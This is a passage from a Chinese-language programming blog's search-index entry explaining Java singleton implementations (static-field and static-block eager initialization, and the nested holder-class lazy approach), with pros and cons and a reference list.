如果没有<code>volatile</code>，可能会发生指令重排序，使得<code>instance</code>先指向内存地址，而对象尚未初始化，其它线程直接使用<code>instance</code>引用进行对象操作时出错。详细原理可参见《<a href="http://www.infoq.com/cn/articles/double-checked-locking-with-delay-initialization" target="_blank" rel="noopener" title="双重检查锁定与延迟初始化">双重检查锁定与延迟初始化</a>》</strong></li></ul><h3 id="利用静态变量饿汉"><a class="markdownIt-Anchor" href="#利用静态变量饿汉"></a> 利用静态变量（饿汉）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton4</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton4</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton4 instance = <span class="keyword">new</span> Singleton4();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton4 <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>优点：实现简单，无线程同步问题</li><li>缺点：在类装载时完成实例化。若该实例一直未被使用，则会造成资源浪费</li></ul><h3 id="利用静态代码块饿汉"><a class="markdownIt-Anchor" href="#利用静态代码块饿汉"></a> 利用静态代码块（饿汉）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton5</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton5 instance;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton5</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        instance = <span class="keyword">new</span> Singleton5();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton5 <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>优点：实现简单，无线程同步问题</li><li>缺点：在类装载时完成实例化。若该实例一直未被使用，则会造成资源浪费</li></ul><h3 id="实现按需创建实例强烈推荐懒汉"><a class="markdownIt-Anchor" href="#实现按需创建实例强烈推荐懒汉"></a> 实现按需创建实例（强烈推荐）（懒汉）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton6</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton6</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Nested</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> Singleton6 instance = <span class="keyword">new</span> Singleton6();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton6 <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Nested.instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>优点：无线程同步问题，实现了懒加载。因为只有调用<code>getInstance()</code>时才会装载内部类，才会创建实例。同时因为使用内部类，先调用内部类的线程会获得类初始化锁，从而保证内部类的初始化（包括实例化它所引用的外部类对象）线程安全。即使内部类创建外部类的实例<code>Singleton6 instance = new Singleton6()</code>发生指令重排也不会引起双重检查下的懒汉模式中提到的问题，因此无须使用<code>volatile</code>关键字。</li><li>缺点：无</li></ul><h2 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> 参考资料</h2><hr /><ul><li><a href="http://www.cnblogs.com/java-my-life/archive/2012/03/31/2425631.html" target="_blank" rel="noopener">java_my_life的《JAVA与模式》之单例模式</a></li><li><a href="http://www.jasongj.com/design_pattern/singleton/" target="_blank" rel="noopener">技术世界的Java设计模式（十） 你真的用对单例模式了吗？</a></li><li><a href="http://www.infoq.com/cn/articles/double-checked-locking-with-delay-initialization" target="_blank" rel="noopener">InfoQ的双重检查锁定与延迟初始化<br /></a></li><li>《剑指offer》（第二版）</li></ul>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计模式 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
